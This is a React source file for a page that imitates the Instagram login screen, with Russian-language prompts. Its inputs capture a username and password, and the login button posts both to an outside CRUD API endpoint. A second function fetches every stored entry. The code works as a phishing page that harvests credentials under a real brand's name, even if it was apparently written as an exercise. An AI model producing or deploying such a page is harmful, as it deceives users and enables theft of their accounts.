import React, { useState } from "react";
import scss from "./index.module.scss";
import axios from "axios";
function Instagram() {
  const [product, setProduct] = useState([]);
  const [name, setName] = useState("");
  const [password, setPassword] = useState("");
  const PostInstagram = () => {
    const newPro = {
      name: name,
      password: password,
    };
    axios.post(
      `https://api-v2.elchocrud.pro/api/v1/b79a75eb98e9218410f3a36bfcd06c69/instagram`,
      newPro
    );
    setProduct([...product, newPro]);
  };
  console.log(product);

  async function USerPassword() {
    const { data } = await axios.get(
      `https://api-v2.elchocrud.pro/api/v1/b79a75eb98e9218410f3a36bfcd06c69/instagram`
    );
    setProduct(data);
  }
  return (
    <div>
      <div className="container">
        <div className={scss.instagram}>
          <p>English(United States)</p>
          <h1>instagram</h1>
          <div className={scss.input}>
            <input
              type="text"
              placeholder="Телефон, имя пользователя или эл. адрес"
              onChange={(e) => setName(e.target.value)}
              value={name}
            />
            <input
              type="text"
              placeholder="Пароль"
              onChange={(e) => setPassword(e.target.value)}
              value={password}
            />
          </div>
          <div className={scss.a}>
            <a className="">Забыли пароль?</a>
            <button onClick={PostInstagram}>Войти</button>
          </div>
          <div className={scss.h3}>
            <h3>
              У вас еще нет аккаунта? <span>Зарегистрироваться</span>
            </h3>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Instagram;
